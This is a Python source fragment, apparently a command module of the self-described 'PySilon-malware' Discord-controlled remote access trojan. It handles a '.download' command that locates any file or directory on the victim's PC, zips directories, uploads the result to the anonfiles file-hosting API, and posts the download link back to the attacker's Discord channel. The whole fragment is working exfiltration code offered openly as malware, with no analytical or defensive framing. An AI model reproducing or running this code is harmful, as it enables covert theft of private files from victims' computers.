from shutil import copy2, rmtree
from zipfile import ZipFile
import os
import requests
# end of imports
# on message
elif message.content[:9] == '.download':
    #.log Message is "download" 
    await message.delete()
    #.log Removed the message 
    if message.channel.id == channel_ids['file']:
        #.log Message channel is the file-related channel 
        if message.content == '.download':
            #.log Author issued empty ".download" command 
            embed = discord.Embed(title="📛 Error",description=f'```Syntax: .download <file-or-directory>```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            #.log Sent embed about usage of ".download" 
        else:
            if os.path.exists('/'.join(working_directory) + '/' + message.content[10:]):
                #.log File requested by Author does exist on this PC 
                target_file = '/'.join(working_directory) + '/' + message.content[10:]
                #.log Determined actual path to requested file 
                if os.path.isdir(target_file):
                    #.log The file turned out to be a directory 
                    target_file += '.zip'
                    with ZipFile(target_file,'w') as zip:
                        for file in get_all_file_paths('.'.join(target_file.split('.')[:-1])):
                            try:
                                zip.write(file)
                                #.log Compressed the directory into .zip 
                            except Exception as e:
                                #.log Error occurred while compressing the directory into .zip 
                                message.channel.send(e)
                                #.log Sent message with information about this error. Aborting operation 
                                pass
                embed = discord.Embed(title="🟢 Success",description=f'```Uploading to anonfiles.. this can take a while depending on the file size, amount and the victim\'s internet speed..```', colour=discord.Colour.green())
                embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
                await message.channel.send(embed=embed)
                #.log Sent message about Anonfiles upload 
                files = {
                    'file': (f'{message.content[10:]}.zip', open(f'{target_file}', 'rb')),
                }
                url = 'https://api.anonfiles.com/upload'
                #.log Set up required things for Anonfiles upload 
                response = requests.post(url, files=files)
                #.log Uploaded the file onto Anonfiles 
                data = response.json()
                #.log Received response from Anonfiles 
                await message.channel.send(f"```{message.content[10:]}.zip:``` {data['data']['file']['url']['short']}")
                #.log Sent Anonfiles link to uploaded file 
            else:
                #.log File requested by Author does not exist on this PC 
                embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
                reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                #.log Sent embed about missing file 
    else:
        #.log Message is not sent on file-related channel 
        embed = discord.Embed(title="📛 Error",description=f'_ _\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
        #.log Sent embed about wrong channel 
